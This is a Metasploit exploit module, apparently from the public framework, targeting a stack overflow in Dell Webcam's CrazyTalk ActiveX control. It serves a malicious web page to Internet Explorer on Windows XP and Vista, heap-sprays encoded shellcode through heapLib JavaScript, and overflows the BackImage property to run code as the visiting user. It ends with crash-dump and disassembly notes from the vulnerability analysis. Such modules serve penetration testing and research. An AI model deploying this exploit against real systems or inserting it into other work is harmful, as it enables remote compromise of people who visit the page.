# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::HttpServer::HTML
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Dell Webcam CrazyTalk ActiveX BackImage Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in Dell Webcam&#039;s CrazyTalk component.
                Specifically, when supplying a long string for a file path to the BackImage
                property, an overflow may occur after checking certain file extension names,
                resulting in remote code execution under the context of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;rgod&#039;,   #Discovery, PoC
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.dell.com/support/drivers/us/en/04/DriverDetails/DriverFileFormats?c=us&l=en&s=bsd&cs=04&DriverId=R230103&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18621/&#039; ],
                    [ &#039;OSVDB&#039;, 80205]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039;         => "seh",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;IE 6 on Windows XP SP3&#039;, { &#039;Offset&#039; => &#039;0x600&#039;} ],
                    [ &#039;IE 7 on Windows XP SP3&#039;, { &#039;Offset&#039; => &#039;0x600&#039;} ],
                    [ &#039;IE 7 on Windows Vista&#039;,  { &#039;Offset&#039; => &#039;0x600&#039;} ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Mar 19 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1]  #IE 6 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
            return targets[2]  #IE 7 on Windows XP SP3
        elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
            return targets[3]  #IE 7 on Windows Vista
        else
            return nil
        end
    end
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
        print_status("#{cli.peerhost}:#{cli.peerport} - Target set: #{my_target.name}")
        p = payload.encoded
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
        js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
        js = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
        while (nops.length < 0x80000) nops += nops;
        var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
        heap_obj.gc();
        for (var i=1; i < 0x300; i++) {
            heap_obj.alloc(block);
        }
        JS
        js = heaplib(js, {:noobfu => true})
        html = <<-EOS
        <html>
        <head>
        <script>
        #{js}
        </script>
        </head>
        <body>
        <object classid=&#039;clsid:13149882-F480-4F6B-8C6A-0764F75B99ED&#039; id=&#039;target&#039;></object>
        <script>
        var arg = "\x0c";
        while (arg.length < 2000) arg += arg;
        target.BackImage = arg.substring(0, 2000);
        </script>
        </html>
        EOS
        print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
end
=begin
The tmp path has the username that we cannot accurately control remotely, so there&#039;s
targetFile = "C:\PROGRA~1\COMMON~1\REALLU~1\CTPLAY~1\CRAZYT~1.OCX"
prototype  = "Invoke_Unknown BackImage As String"
memberName = "BackImage"
progid     = "CRAZYTALK4Lib.CrazyTalk4"
argCount   = 1
(d4c.d9c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=10005970 ecx=0000b3a0 edx=020bf34f esi=03422f98 edi=020bf5ac
eip=41414141 esp=020bf33c ebp=020bf390 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
<Unloaded_Ed20.dll>+0x41414140:
41414141 ??              ???
======
.text:03854F59 lea     ecx, [esp+33Ch+Str1]
.text:03854F5D push    offset a_asp    ; ".asp"
.text:03854F62 push    ecx             ; Str1
.text:03854F63 mov     [esp+344h+var_308], 0
.text:03854F68 call    ebx ; _stricmp           <-- Nope
.text:03854F71 lea     edx, [esp+328h+Str1]
.text:03854F75 push    offset a_php    ; ".php"
.text:03854F7A push    edx             ; Str1
.text:03854F7B call    ebx ; _stricmp           <--- Still nope
.text:03854F84 mov     ebx, [esp+328h+Dest]
.text:03854F8B lea     eax, [esp+328h+Str1]
.text:03854F8F lea     ecx, [esp+328h+Filename]
.text:03854F96 push    eax
.text:03854F97 add     esi, 3B44h
.text:03854F9D push    ecx
.text:03854F9E push    esi
.text:03854F9F push    offset aSSS     ; "%s%s%s"
.text:03854FA4 push    ebx             ; Dest
.text:03854FA5 call    ds:sprintf
=end



